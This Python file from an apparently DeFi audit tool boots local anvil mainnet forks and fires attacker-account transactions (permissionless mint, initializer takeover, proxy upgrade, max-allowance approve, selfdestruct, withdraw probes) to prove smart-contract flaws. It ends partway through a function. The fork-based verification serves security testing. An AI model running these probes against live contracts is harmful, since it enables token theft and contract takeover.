"""Attack simulator — fork-based simulation"""
import subprocess
from typing import Dict, List, Optional

from defihunter.core import abi as abi_util

def run(cmd: str, timeout: int = 60) -> str:
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return result.stdout.strip()

class AttackSimulator:
    def __init__(self, rpc_url: Optional[str] = None, block: Optional[int] = None):
        self.rpc_url = rpc_url or 'http://localhost:8545'
        self.block = block
    
    def run(self, attack_type: str, target: str) -> Dict:
        """Run attack simulation"""
        if attack_type == 'inflation':
            return self._simulate_inflation(target)
        elif attack_type == 'admin':
            return self._simulate_admin(target)
        elif attack_type == 'governance':
            return self._simulate_governance(target)
        elif attack_type == 'oracle':
            return self._simulate_oracle(target)
        elif attack_type == 'reentrancy':
            return self._simulate_reentrancy(target)
        elif attack_type == 'bridge':
            return self._simulate_bridge(target)
        elif attack_type == 'sandwich':
            return self._simulate_sandwich(target)
        elif attack_type == 'twap':
            return self._simulate_twap(target)
        elif attack_type == 'flashloan':
            return self._simulate_flashloan(target)
        elif attack_type == 'withdraw':
            return self._simulate_withdraw(target)
        elif attack_type == 'initialize':
            return self._simulate_initialize(target)
        elif attack_type == 'permit':
            return self._simulate_permit(target)
        elif attack_type == 'liquidation':
            return self._simulate_liquidation(target)
        elif attack_type == 'forcesend':
            return self._simulate_forcesend(target)
        elif attack_type == 'peg':
            return self._simulate_peg(target)
        elif attack_type == 'crossfunc':
            return self._simulate_crossfunc(target)
        elif attack_type == 'delegatecall':
            return self._simulate_delegatecall(target)
        elif attack_type == 'mint':
            return self._simulate_mint(target)
        else:
            return {'success': False, 'error': f'Unknown attack type: {attack_type}'}
    
    def _simulate_inflation(self, target: str) -> Dict:
        """Simulate inflation attack"""
        steps = []
        
        # Read initial state
        ts = run(f'cast call {target} "totalSupply()(uint256)" --rpc-url {self.rpc_url} 2>/dev/null')
        steps.append({'step': 'Initial totalSupply', 'value': ts})
        
        # Check if deposit function exists
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_deposit = '6e553f65' in code or 'b6b55f25' in code
        
        if has_deposit:
            steps.append({'step': 'Deposit function found', 'value': 'vulnerable'})
            return {
                'success': True,
                'steps': steps,
                'profit': 'Variable (depends on victim deposit)',
                'description': 'First depositor can inflate share price via donation',
            }
        else:
            return {
                'success': False,
                'steps': steps,
                'error': 'No standard deposit function found',
            }
    
    def _simulate_admin(self, target: str) -> Dict:
        """Simulate admin key compromise"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        
        has_admin = any(s in code for s in ['bf353dbb', '65fae35e', '9c52a7f1'])
        has_file = '4c929902' in code
        has_drip = 'd370ff70' in code
        
        if has_admin:
            return {
                'success': True,
                'steps': [
                    {'step': 'Admin function found', 'value': 'wards/rely/deny'},
                    {'step': 'File function found', 'value': str(has_file)},
                    {'step': 'Drip function found', 'value': str(has_drip)},
                ],
                'profit': 'All funds in contract',
                'description': 'Admin can drain all value via file() + drip()',
            }
        return {'success': False, 'error': 'No admin functions detected'}
    
    def _simulate_governance(self, target: str) -> Dict:
        """Simulate flash loan governance attack"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        
        has_votes = any(s in code for s in ['getVotes', 'getPriorVotes', 'delegates'])
        
        if has_votes:
            return {
                'success': True,
                'description': 'Token has voting — check for snapshot protection',
            }
        return {'success': False, 'error': 'No voting functions detected'}
    
    def _simulate_oracle(self, target: str) -> Dict:
        """Simulate oracle manipulation"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # Chainlink-style getPrice / getAssetPrice selector-ish markers
        has_price = any(s in code for s in ['50d25bcd', 'b1c5e427', '4b43f4a4'])  # latestAnswer / getPrice / update
        if has_price:
            return {
                'success': True,
                'steps': [
                    {'step': 'Price oracle functions found', 'value': 'queryable'},
                    {'step': 'Check data source', 'value': 'DEX spot or TWAP?'},
                ],
                'profit': 'Depends on depth of DEX liquidity',
                'description': 'If oracle reads DEX spot price, a flash-loan swap can manipulate it',
            }
        return {'success': False, 'error': 'No price oracle functions detected'}

    def _simulate_reentrancy(self, target: str) -> Dict:
        """Simulate reentrancy attack"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # Check for common reentrancy hooks: ERC777 tokensReceived, onFlashLoan, withdraw
        has_hooks = any(s in code for s in ['e3a4da69', '5cffe9de', '3ccfd60b'])  # tokensReceived / flashLoan / withdraw
        if has_hooks:
            return {
                'success': True,
                'steps': [
                    {'step': 'External callbacks found', 'value': 'tokensReceived/onFlashLoan'},
                    {'step': 'Check for ReentrancyGuard', 'value': 'missing? (simulate)'},
                ],
                'profit': 'All funds in pool',
                'description': 'External callback before state update allows recursive drain',
            }
        return {'success': False, 'error': 'No reentrancy hooks detected'}

    def _simulate_bridge(self, target: str) -> Dict:
        """Simulate bridge deposit spoof"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # mint selector + finalize/flush selectors
        has_mint = 'a0712d68' in code
        has_finalize = any(s in code for s in ['20dd9f18', '0ecbd0b7', '0b37eb8b'])  # finalizeDeposit variants
        if has_mint or has_finalize:
            return {
                'success': True,
                'steps': [
                    {'step': 'Mint function found', 'value': str(has_mint)},
                    {'step': 'Finalize/deposit function found', 'value': str(has_finalize)},
                    {'step': 'Check proof verification', 'value': 'signatures/oracle required?'},
                ],
                'profit': 'Unbounded (all bridge collateral)',
                'description': 'Bridge mint without proper proof verification lets attacker fabricate deposits',
            }
        return {'success': False, 'error': 'No bridge mint/finalize functions detected'}

    def _simulate_sandwich(self, target: str) -> Dict:
        """Simulate MEV sandwich — informational, needs mempool"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_swap = '022c0d9f' in code  # swap(uint256,uint256,address,bytes)
        if has_swap:
            return {
                'success': True,
                'steps': [
                    {'step': 'AMM pair found (swap selector)', 'value': 'sandwichable'},
                    {'step': 'Requires mempool access', 'value': 'flashbots/private mempool'},
                ],
                'profit': 'Slippage captured from victim',
                'description': 'Front-run + back-run around victim swap to extract value',
            }
        return {'success': False, 'error': 'No AMM swap function detected'}

    def _simulate_twap(self, target: str) -> Dict:
        """Simulate TWAP oracle manipulation"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # UniswapV2 pair TWAP: observe / consult / price0CumulativeLast
        has_twap = any(s in code for s in ['883bdbfd', 'c22cee0b', '5e76e5d4'])  # observe / consult / price0CumulativeLast
        if has_twap:
            return {
                'success': True,
                'steps': [
                    {'step': 'TWAP functions found', 'value': 'check window length'},
                    {'step': 'Short window?', 'value': 'manipulable via flash loan'},
                ],
                'profit': 'Depends on protocol trusting TWAP',
                'description': 'TWAP with short observation window can be moved with a flash loan',
            }
        return {'success': False, 'error': 'No TWAP functions detected'}

    def _simulate_flashloan(self, target: str) -> Dict:
        """Simulate flash loan reentrancy combo"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_flash = '5cffe9de' in code  # flashLoan(address,address,uint256,bytes)
        if has_flash:
            return {
                'success': True,
                'steps': [
                    {'step': 'FlashLoan function found', 'value': 'capital source available'},
                    {'step': 'Chain with reentrancy', 'value': 'see reentrancy_attack'},
                ],
                'profit': 'All funds in pool',
                'description': 'Flash loan funds the reentrancy drain with zero upfront capital',
            }
        return {'success': False, 'error': 'No flashLoan function detected'}

    def _simulate_withdraw(self, target: str) -> Dict:
        """Simulate withdraw front-run / share price manipulation"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # ERC-4626: convertToAssets / previewRedeem / redeem
        has_4626 = any(s in code for s in ['07a2d13a', '4cdad506', 'ba087652', 'd905777e'])
        if has_4626:
            return {
                'success': True,
                'steps': [
                    {'step': 'ERC-4626 functions found', 'value': 'convertToAssets/redeem'},
                    {'step': 'Rounding direction exploitable?', 'value': 'simulate with 1 wei units'},
                ],
                'profit': 'Small per victim; scales with volume',
                'description': 'Share price rounding / moves can be front-run to victimize large withdraws',
            }
        return {'success': False, 'error': 'No ERC-4626 functions detected'}

    def _simulate_initialize(self, target: str) -> Dict:
        """Simulate unguarded initializer on upgradeable proxy"""
        # Check EIP-1967 implementation slot
        impl = run(f'cast storage {target} 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url {self.rpc_url} 2>/dev/null')
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_init = '1cf5d2a8' in code or 'fe4b84df' in code  # initialize() / initialize(address)
        if impl and impl != '0x' and has_init:
            return {
                'success': True,
                'steps': [
                    {'step': 'EIP-1967 proxy detected', 'value': impl[:42]},
                    {'step': 'initialize() present', 'value': 'check if already initialized'},
                ],
                'profit': 'Full contract takeover',
                'description': 'Unguarded initialize() on a proxy allows first-caller ownership takeover',
            }
        return {'success': False, 'error': 'Not an upgradeable proxy with initialize(), or already initialized'}

    def _simulate_permit(self, target: str) -> Dict:
        """Simulate cross-chain permit replay"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_permit = 'd505accf' in code  # permit(owner,spender,value,deadline,v,r,s)
        if has_permit:
            return {
                'success': True,
                'steps': [
                    {'step': 'EIP-2612 permit found', 'value': 'check domain separator'},
                    {'step': 'ChainId in domain?', 'value': 'if missing -> cross-chain replay'},
                ],
                'profit': 'Victim allowance on multiple chains',
                'description': 'Permit signatures replayable across chains if domain separator omits chainId',
            }
        return {'success': False, 'error': 'No permit function detected'}

    def _simulate_liquidation(self, target: str) -> Dict:
        """Simulate liquidation race"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_liq = '69ab90df' in code  # liquidate(address,uint256,address,address)
        if has_liq:
            return {
                'success': True,
                'steps': [
                    {'step': 'liquidate() found', 'value': 'liquidation bonus claimable'},
                    {'step': 'Health monitoring required', 'value': 'front-run on health drop'},
                ],
                'profit': 'Liquidation bonus per position',
                'description': 'Race/front-run liquidations to capture the bonus before others',
            }
        return {'success': False, 'error': 'No liquidate function detected'}

    def _simulate_forcesend(self, target: str) -> Dict:
        """Simulate forced ETH send breaking accounting"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        # Does the vault use balanceOf(address(this))? Heuristic: ERC-4626 totalAssets
        has_assets = '01e1d114' in code  # totalAssets()
        if has_assets:
            return {
                'success': True,
                'steps': [
                    {'step': 'totalAssets() found', 'value': 'check internal vs balanceOf'},
                    {'step': 'selfdestruct force-send', 'value': 'inflates share price'},
                ],
                'profit': 'Share price inflation',
                'description': 'Force-sent ETH (selfdestruct/coinbase) inflates balance-based share price',
            }
        return {'success': False, 'error': 'No totalAssets() function detected'}

    def _simulate_peg(self, target: str) -> Dict:
        """Simulate stablecoin collateral swap attack"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_vault = '5b6fc7a8' in code  # openVault()
        has_swap = any(s in code for s in ['76cc7a9a', '0f7ee467'])  # swapCollateral variants
        if has_vault and has_swap:
            return {
                'success': True,
                'steps': [
                    {'step': 'Vault open + collateral swap found', 'value': 'check price source'},
                    {'step': 'Combine with twap/oracle attack', 'value': 'mint > backing'},
                ],
                'profit': 'Minted stablecoin minus collateral cost',
                'description': 'Collateral swap at distorted price lets attacker mint unbacked stablecoin',
            }
        return {'success': False, 'error': 'No collateral swap / vault functions detected'}

    def _simulate_crossfunc(self, target: str) -> Dict:
        """Simulate cross-function reentrancy (withdraw sends before state update)"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_withdraw_balance = '5fd8c710' in code  # withdrawBalance()
        has_transfer = '56a6d9ef' in code  # transferBalance(address,uint256)
        if has_withdraw_balance and has_transfer:
            return {
                'success': True,
                'steps': [
                    {'step': 'withdrawBalance() sends before zeroing', 'value': 'reentrant receive() hook'},
                    {'step': 're-enter transferBalance()', 'value': 'double-credit funds to second account'},
                ],
                'profit': 'Withdrawal + transferred balance (value from thin air)',
                'description': 'Cross-function reentrancy: state updated after the external call in one function, other function unprotected',
            }
        return {'success': False, 'error': 'No cross-function reentrancy surface detected'}

    def _simulate_delegatecall(self, target: str) -> Dict:
        """Simulate arbitrary delegatecall via unauthenticated proxy upgrade"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_set_impl = 'd784d426' in code  # setImplementation(address)
        if has_set_impl:
            return {
                'success': True,
                'steps': [
                    {'step': 'setImplementation(address) found', 'value': 'check access control'},
                    {'step': 'Point proxy at attacker contract', 'value': 'delegatecall runs in proxy context'},
                    {'step': 'Steal proxy ETH / overwrite storage', 'value': 'layout collision or balance sweep'},
                ],
                'profit': 'Full proxy ETH balance + storage takeover',
                'description': 'Unauthenticated proxy upgrade allows arbitrary delegatecall',
            }
        return {'success': False, 'error': 'No setImplementation / proxy upgrade path detected'}

    def _simulate_mint(self, target: str) -> Dict:
        """Simulate permissionless mint (missing access control)"""
        code = run(f'cast code {target} --rpc-url {self.rpc_url} 2>/dev/null')
        has_mint = '40c10f19' in code  # mint(address,uint256)
        if has_mint:
            return {
                'success': True,
                'steps': [
                    {'step': 'public mint(address,uint256) found', 'value': 'call it directly'},
                    {'step': 'Mint unlimited supply to attacker', 'value': 'dilute holders'},
                    {'step': 'Dump minted tokens', 'value': 'swap for real assets'},
                ],
                'profit': 'Unlimited token supply minted for free',
                'description': 'Token mint() lacks onlyOwner/minter role check',
            }
        return {'success': False, 'error': 'No public mint(address,uint256) detected'}

# ---------------------------------------------------------------------------
# ForkSimulator — REAL fork verification (anvil + cast).
# Static analysis says "possible"; an eth_call from an arbitrary attacker
# account on a mainnet fork says "provable". Degrades gracefully when the
# foundry binaries or an RPC URL are unavailable — the wizard keeps running.
# ---------------------------------------------------------------------------

class ForkSimulator:
    """Context manager: boot an anvil fork, prove callable-by-anyone
    findings with real eth_call, tear the fork down on exit.

    Usage:
        with ForkSimulator(rpc_url="https://eth-mainnet...") as fork:
            if not fork.available:
                print(fork.why_not)
            fork.run("mint", "0x1234...")
    """

    def __init__(self, rpc_url: Optional[str] = None, block: Optional[int] = None,
                 port: Optional[int] = None):
        self.rpc_url = rpc_url
        self.block = block
        self.port = port or self._free_port()
        self.proc = None
        self.available = False
        self.why_not = ""
        # anvil dev account #2: always unlocked + funded on any anvil fork, and
        # from the protocol's perspective it is just an arbitrary EOA.
        self.attacker = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"
        # real ABI for the target (when known) — see run(abi=...)
        self._abi: List[Dict] = []
        self._attack_candidates: List[tuple] = []

    # Function names that carry each attack route. The ABI tells us the REAL
    # signature with the REAL input types — no more selector guessing.
    ATTACK_FN_NAMES = {
        "mint": ["mint", "mintTo", "mintToken"],
        "initialize": ["initialize", "init"],
        "delegatecall": ["upgradeTo", "upgrade", "setImplementation",
                         "setTarget", "changeImplementation",
                         "updateImplementation", "setLogic"],
        "reentrancy": ["withdraw", "withdrawTo", "claim", "redeem", "unstake",
                       "harvest", "withdrawAll", "emergencyWithdraw"],
        "arbitrarycall": ["execute", "call", "exec", "performAction",
                          "governanceCall", "forward", "execute3"],
        "approve": ["approve", "setApprovalForAll", "increaseAllowance"],
        "selfdestruct": ["selfdestruct", "kill", "destroy", "die",
                         "killMe", "close"],
    }
    MAX_UINT = ("11579208923731619542357098500868790785326998466564056403"
                "9457584007913129639935")

    def _abi_candidates(self, attack: str) -> List[tuple]:
        """(signature, args) pairs for functions in the REAL ABI that map to
        this attack route. Empty when the ABI is unknown or has no match —
        callers fall back to the hardcoded guess battery."""
        out = []
        for fn in abi_util.functions(self._abi):
            name = fn.get("name", "")
            if name not in self.ATTACK_FN_NAMES.get(attack, ()):
                continue
            args = []
            for inp in fn.get("inputs", []):
                t = inp.get("type", "")
                if t == "address":
                    args.append(self.attacker)
                elif t.startswith("uint"):
                    if attack == "approve":
                        args.append(self.MAX_UINT)
                    elif attack == "reentrancy":
                        args.append("1")  # 1 wei — avoids balance limits
                    else:
                        args.append("1000000")
                elif t == "bool":
                    args.append("true")
                elif t == "bytes":
                    args.append("0x" + "00" * 4)
                elif t == "string":
                    args.append("")
                else:
                    args.append("0")
            out.append((abi_util.canonical(fn), args))
        return out

    def _merge_candidates(self, hardcoded: List[tuple]) -> List[tuple]:
        """ABI-derived candidates first; hardcoded guesses only when the ABI
        did not already give us that exact signature."""
        abi_sigs = {sig for sig, _ in self._attack_candidates}
        return (self._attack_candidates
                + [c for c in hardcoded if c[0] not in abi_sigs])

    @staticmethod
    def _free_port() -> int:
        import socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("127.0.0.1", 0))
            return s.getsockname()[1]

    def _has_tool(self, name: str) -> bool:
        import shutil
        return shutil.which(name) is not None

    def __enter__(self) -> "ForkSimulator":
        if not self._has_tool("anvil") or not self._has_tool("cast"):
            self.why_not = ("Fork verification skipped: foundry binaries "
                            "(anvil/cast) not found on PATH.")
            return self
        if not self.rpc_url or "http" not in self.rpc_url:
            self.why_not = ("Fork verification skipped: no mainnet RPC URL "
                            "available to fork.")
            return self
        import subprocess as sp
        cmd = ["anvil", "--port", str(self.port), "--fork-url", self.rpc_url,
               "--silent"]
        if self.block:
            cmd += ["--fork-block-number", str(self.block)]
        try:
            self.proc = sp.Popen(cmd, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        except OSError as e:
            self.why_not = f"Fork verification skipped: could not start anvil ({e})."
            return self
        if self._wait_ready(40):
            self.available = True
        else:
            self.why_not = "Fork verification skipped: anvil fork did not become ready."
            self.__exit__(None, None, None)
        return self

    def _wait_ready(self, timeout: int = 40) -> bool:
        import time
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                out = subprocess.run(
                    ["cast", "block-number", "--rpc-url", self.rpc_url_local],
                    capture_output=True, text=True, timeout=5,
                )
                if out.returncode == 0 and out.stdout.strip().isdigit():
                    return True
            except Exception:
                pass
            time.sleep(1)
        return False

    @property
    def rpc_url_local(self) -> str:
        return f"http://127.0.0.1:{self.port}"

    def _call(self, selector: str, args: List[str], extra_from: bool = True) -> Dict:
        cmd = ["cast", "call", self._target, selector, *args,
               "--rpc-url", self.rpc_url_local]
        if extra_from:
            cmd += ["--from", self.attacker]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip()}

    def _read(self, selector: str) -> str:
        """Read a state variable (no from-address needed for view reads)."""
        proc = subprocess.run(
            ["cast", "call", self._target, selector, "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        return proc.stdout.strip() or proc.stderr.strip()

    def _fund_attacker(self) -> bool:
        """Give the attacker 1 ETH on the fork so real sends can pay gas."""
        proc = subprocess.run(
            ["cast", "rpc", "anvil_setBalance", self.attacker,
             "0xDE0B6B3A7640000", "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        # anvil_setBalance returns JSON 'null' on success — exit code is the truth.
        return proc.returncode == 0

    def _has_code(self) -> bool:
        """True when the target actually has bytecode on this fork.

        Calling initialize()/mint() on an EOA or a devnet-only address that
        does not exist on mainnet MINES VACUOUSLY (plain value transfer) —
        without this check a phantom address would be reported EXPLOITABLE.
        """
        proc = subprocess.run(
            ["cast", "code", self._target, "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        out = proc.stdout.strip().lower()
        return bool(out and out not in ("0x", "0x0"))

    def _balance(self, addr: str) -> str:
        """Raw wei ETH balance of an address on the fork (eth_getBalance)."""
        proc = subprocess.run(
            ["cast", "balance", addr, "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        return proc.stdout.strip() or proc.stderr.strip()

    def _send(self, selector: str, args: List[str]) -> Dict:
        """A REAL state-changing tx from the attacker account (fork-local)."""
        if not self._fund_attacker():
            return {"ok": False, "stdout": "", "stderr": "could not fund attacker"}
        cmd = ["cast", "send", "--unlocked", self._target, selector, *args,
               "--from", self.attacker, "--rpc-url", self.rpc_url_local]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip()}

    def run(self, attack: str, target: str, source_finding: Optional[Dict] = None,
            abi: Optional[List[Dict]] = None) -> Dict:
        """Prove the finding on a real anvil fork, using the contract's REAL
        ABI when provided (real signatures, real input types — no guessing).

        Returns a result dict with a `verdict`:
          CONFIRMED   — a state-changing tx from an arbitrary account mined
                        (or an eth_call returned) and evidence shows effect
          REFUTED     — the ABI says the function exists but every call
                        reverted (or the target has no code) → NOT callable
          UNVERIFIED  — could not prove either way (no ABI, no matching
                        function, or the fork never came up)
        """
        self._abi = abi or []
        self._attack_candidates = self._abi_candidates(attack)
        res = self._run_impl(attack, target, source_finding)
        if res.get("success"):
            res["verdict"] = "CONFIRMED"
        elif res.get("verdict"):  # already set inside (e.g. no code on fork)
            pass
        elif not self.available:
            res["verdict"] = "UNVERIFIED"
        elif self._attack_candidates:
            res["verdict"] = "REFUTED"
        else:
            res["verdict"] = "UNVERIFIED"
        return res

    def _run_impl(self, attack: str, target: str, source_finding: Optional[Dict] = None) -> Dict:
        """Prove the finding on a real anvil fork.

        mint / initialize get the full state-changing proof: the attacker is
        funded on the fork, the tx actually executes, and the resulting state
        (balanceOf / owner) is read back as evidence. delegatecall is proven
        via eth_call (an actual upgrade would clobber fork state for later
        checks). A non-reverting call/tx = the function is callable by anyone
        = the static finding is a live surface.
        """
        if not self.available:
            return {"success": False, "error": self.why_not, "attack": attack,
                    "target": target, "source_finding": source_finding}
        self._target = target
        steps: List[Dict] = []

        if not self._has_code():
            # No bytecode at the target on this fork: the address does not
            # exist on this network (devnet-only deploy, placeholder, EOA).
            # Any tx/call would mine vacuously — NOT evidence of exploitability.
            return {"success": False, "attack": attack, "target": target,
                    "verdict": "REFUTED",
                    "steps": [{"step": "code check",
                               "value": "no code at address on this fork"}],
                    "evidence": ("target has no bytecode on this fork "
                                 "(not a live contract on this network)"),
                    "source_finding": source_finding}

        if attack == "mint":
            # state-diff: read attacker balance BEFORE the tx, then after
            br0 = self._call("balanceOf(address)", [self.attacker], extra_from=False)
            before = br0["stdout"] or "0"
            tried = []
            for sel, args in self._merge_candidates(
                    [("mint(address,uint256)", [self.attacker, "1000000"])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    br = self._call("balanceOf(address)", [self.attacker], extra_from=False)
                    bal = br["stdout"]
                    steps.append({"step": sel + " sent from arbitrary account",
                                  "value": "tx mined ✅"})
                    steps.append({"step": f"balanceOf({self.attacker[:10]}…) before → after",
                                  "value": f"{before} → {bal or 'read failed'}"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Unlimited token supply minted for free",
                            "steps": steps,
                            "evidence": f"balanceOf(attacker) {before} → {bal or 'n/a'}",
                            "source_finding": source_finding}
            steps.append({"step": "mint selectors tried", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps, "evidence": r["stderr"][:200] if r else "no mint() found",
                    "source_finding": source_finding}

        if attack == "initialize":
            owner_before = self._read("owner()")
            tried = []
            for sel, args in self._merge_candidates(
                    [("initialize(address)", [self.attacker]),
                     ("initialize()", [])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    steps.append({"step": sel + " sent from arbitrary account",
                                  "value": "tx mined — not yet initialized!"})
                    owner = self._read("owner()")
                    steps.append({"step": "owner() before → after",
                                  "value": f"{owner_before or 'n/a'} → {owner}"})
                    norm = lambda h: h.lower().replace("0x", "").lstrip("0")
                    owned = norm(owner) == norm(self.attacker)
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Full contract takeover (first-caller becomes owner)",
                            "steps": steps,
                            "evidence": (f"owner() {owner_before or 'n/a'} → {owner} "
                                         f"(attacker {'IS' if owned else 'NOT'} owner)"),
                            "source_finding": source_finding}
            steps.append({"step": "initialize() attempts", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "All initialize() variants reverted (likely guarded/already initialized).",
                    "source_finding": source_finding}

        if attack == "delegatecall":
            # Permissionless proxy upgrade = arbitrary delegatecall.
            # eth_call only: an actual upgradeTo would replace the fork's
            # implementation and invalidate every subsequent check.
            dummy = "0x2222222222222222222222222222222222222222"
            tried = []
            for sel, args in self._merge_candidates(
                    [("upgradeTo(address)", [dummy]),
                     ("setImplementation(address)", [dummy]),
                     ("setTarget(address)", [dummy])]):
                r = self._call(sel, args)
                tried.append(f"{sel}: {'returned' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    steps.append({"step": sel + " from arbitrary account",
                                  "value": "returned — proxy upgradeable by anyone"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Full proxy storage/balance takeover via delegatecall",
                            "steps": steps, "evidence": sel,
                            "source_finding": source_finding}
            steps.append({"step": "proxy-upgrade selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "No permissionless proxy-upgrade selector found.",
                    "source_finding": source_finding}

        if attack == "reentrancy":
            # A payout sink callable by anyone = an open reentrancy window
            # (The DAO 2016 pattern): ETH leaves the contract before state
            # settles, so a callback can re-enter and double-withdraw.
            tried = []
            for sel, args in self._merge_candidates(
                    [("withdraw(uint256)", ["1000"]),
                     ("withdraw()", []),
                     ("claim()", []),
                     ("redeem()", []),
                     ("unstake()", []),
                     ("harvest()", []),
                     ("withdrawAll()", []),
                     ("emergencyWithdraw()", [])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    steps.append({"step": sel + " sent from arbitrary account",
                                  "value": "mined — payout sink callable by anyone"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Reentrancy window: payout sends ETH before state settles",
                            "steps": steps,
                            "evidence": f"{sel} callable by arbitrary account",
                            "source_finding": source_finding}
            steps.append({"step": "payout selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": ("No permissionless payout sink found "
                                 "(withdraw/claim/redeem/unstake/harvest)."),
                    "source_finding": source_finding}

        if attack == "arbitrarycall":
            # A forwarder callable by anyone with attacker-supplied calldata =
            # the arbitrary-exec primitive behind governance takeovers and
            # token drains (Parity 2017 lineage). eth_call only: executing
            # attacker calldata would clobber fork state for later checks.
            payload = "0x" + "00" * 4  # benign no-op calldata for the callee
            tried = []
            for sel, args in self._merge_candidates(
                    [("execute(address,bytes)", [self.attacker, payload]),
                     ("call(address,bytes)", [self.attacker, payload]),
                     ("exec(address,bytes)", [self.attacker, payload]),
                     ("performAction(address,bytes)", [self.attacker, payload]),
                     ("execute(address,uint256,bytes)", [self.attacker, "0", payload]),
                     ("governanceCall(address,bytes)", [self.attacker, payload])]):
                r = self._call(sel, args)
                tried.append(f"{sel}: {'returned' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    steps.append({"step": sel + " from arbitrary account",
                                  "value": "returned — attacker calldata forwarded"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": ("Arbitrary external call with attacker-controlled "
                                       "calldata (token drain / governance takeover)"),
                            "steps": steps, "evidence": sel,
                            "source_finding": source_finding}
            steps.append({"step": "forwarder selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "No permissionless calldata forwarder found.",
                    "source_finding": source_finding}

        if attack == "approve":
            # Attacker granting itself spending allowance over the target =
            # the primitive behind ERC20 drains: once allowance
            # (target → attacker) > 0, transferFrom can move the target's
            # entire balance in one tx.
            max_allow = "115792089237316195423570985008687907853269984665640564039457584007913129639935"
            tried = []
            for sel, args in self._merge_candidates(
                    [("approve(address,uint256)", [self.attacker, max_allow]),
                     ("setApprovalForAll(address,bool)", [self.attacker, "true"])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    allow = self._call("allowance(address,address)",
                                       [self._target, self.attacker], extra_from=False)
                    steps.append({"step": sel + " from arbitrary account",
                                  "value": "mined — allowance granted"})
                    steps.append({"step": "allowance(target → attacker) after",
                                  "value": allow["stdout"] or "read failed"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Attacker granted itself spending allowance over the target",
                            "steps": steps,
                            "evidence": "allowance(target→attacker) > 0",
                            "source_finding": source_finding}
            steps.append({"step": "approval selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "No permissionless approve()/setApprovalForAll() found.",
                    "source_finding": source_finding}

        if attack == "selfdestruct":
            before = self._balance(self._target)
            tried = []
            for sel, args in self._merge_candidates(
                    [("selfdestruct()", []),
                     ("kill()", []),
                     ("destroy()", []),
                     ("die()", []),
                     ("kill(address)", [self.attacker]),
                     ("destroy(address)", [self.attacker]),
                     ("selfdestruct(address)", [self.attacker])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    gone = not self._has_code()
                    after = self._balance(self._target)
                    steps.append({"step": sel + " from arbitrary account",
                                  "value": "mined ✅"})
                    steps.append({"step": "code after",
                                  "value": ("removed" if gone else
                                            "still present (EIP-6780: balance transferred)" )})
                    steps.append({"step": "target ETH before → after",
                                  "value": f"{before} → {after}"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Kill switch: contract balance transferred / code destroyed",
                            "steps": steps,
                            "evidence": f"{sel} mined — ETH {before} → {after}",
                            "source_finding": source_finding}
